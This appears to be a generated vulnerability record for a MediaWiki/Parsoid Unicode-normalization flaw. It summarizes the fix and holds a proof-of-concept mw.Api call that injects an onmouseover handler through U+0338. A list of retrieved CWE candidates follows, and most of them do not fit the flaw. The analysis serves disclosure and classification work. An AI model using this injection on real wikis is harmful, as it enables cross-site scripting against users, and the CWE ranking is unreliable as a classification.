## Vulnerability Description
Vulnerability in Wikimedia Foundation MediaWiki, Wikimedia Foundation Parsoid.This issue affects MediaWiki before 1.39.12, 1.42.6, 1.43.1 Parsoid before 0.16.5, 0.19.2, 0.20.2.

### Vulnerability Description Key Phrases
- **product:** MediaWiki, Parsoid
- **version:** before 1.39.12, 1.42.6, 1.43.1

## CVE Reference Links Content Summary
**Content from phabricator.wikimedia.org_7de68125_20250624_201902.html (text)**

*   **Root cause of vulnerability:** The MediaWiki Action API converts output to Unicode Normalization Form C, which is unsafe for HTML strings because the sequence ‘>’ + U+0338 gets replaced by U+226F, breaking the tag end.
*   **Weaknesses/vulnerabilities present:** Potential JavaScript injection attack enabled by Unicode normalization in Action API. The HTML tag is broken, potentially allowing a Javascript injection attack.
*   **Impact of exploitation:** JavaScript injection.
*   **Attack vectors:**
    1.  Visit any wiki page, such that mw.Api() has loaded
    2.  Open the console
    3.  Perform any mw.Api call that generates HTML, such that you can make the first character inside a tag be U+0338 COMBINING LONG SOLIDUS OVERLAY.

    For example, call { action: 'visualeditor', paction: 'parsefragment' } as follows:

    ```
    const COMBINING_LONG_SOLIDUS = '\u0338';
    new mw.Api().post( {
            action:  'visualeditor',
            paction: 'parsefragment',
            page: 'Test',
            wikitext: COMBINING_LONG_SOLIDUS + ' onmouseover="alert(42)" >content'
    } ).done( ( data ) => {
            const content = data.visualeditor.content;
            document.body.innerHTML = content
            console.log( 'Content:', content );
    } ).fail( ( err ) => console.error( err ) );
    ```

*   **Required attacker capabilities/position:** An attacker needs to be able to inject the specific unicode character sequence ('>' + U+0338) into the HTML output. The attacker needs to be able to perform an mw.Api call and inject javascript.
*   **Mitigation or fix:** The patch ensures emitted HTML is safe against Unicode NFC normalization. The fix is to add U+0338 escaping to every place in Message.php which had a call to htmlspecialchars. The patches include:
    *   0001-Ensure-emitted-HTML-is-safe-against-Unicode-NFC-norm.patch
    *   0001-Entity-escape-U-0338-where-needed-to-make-HTML-outpu.patch
    *   Backports for the core patch in REL1\_39, REL1\_42, REL1\_43, and master.

**Content from phabricator.wikimedia.org_c7a21489_20250624_211403.html (text)**

UNRELATED

## Retriever Results

### Top Combined Results

| Rank | CWE ID | Name | Abstraction | Usage  | Retrievers | Individual Scores |
|------|--------|------|-------------|-------|------------|-------------------|
| 1 | 113 | Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Request/Response Splitting') | Variant | Allowed | sparse | 0.041 |
| 2 | 400 | Uncontrolled Resource Consumption | Class | Discouraged | sparse | 0.041 |
| 3 | 269 | Improper Privilege Management | Class | Discouraged | sparse | 0.041 |
| 4 | 77 | Improper Neutralization of Special Elements used in a Command ('Command Injection') | Class | Allowed-with-Review | sparse | 0.040 |
| 5 | 201 | Insertion of Sensitive Information Into Sent Data | Base | Allowed | sparse | 0.039 |
| 6 | 755 | Improper Handling of Exceptional Conditions | Class | Discouraged | sparse | 0.038 |
| 7 | 918 | Server-Side Request Forgery (SSRF) | Base | Allowed | sparse | 0.037 |
| 8 | 674 | Uncontrolled Recursion | Class | Allowed-with-Review | sparse | 0.037 |
| 9 | 639 | Authorization Bypass Through User-Controlled Key | Base | Allowed | dense | 0.523 |
| 10 | 79 | Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') | Base | Allowed | graph | 0.003 |



# Complete CWE Specifications

CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Request/Response Splitting')

CWE-400: Uncontrolled Resource Consumption

CWE-269: Improper Privilege Management

CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')

CWE-201: Insertion of Sensitive Information Into Sent Data

CWE-755: Improper Handling of Exceptional Conditions

CWE-918: Server-Side Request Forgery (SSRF)

CWE-674: Uncontrolled Recursion

CWE-639: Authorization Bypass Through User-Controlled Key

CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')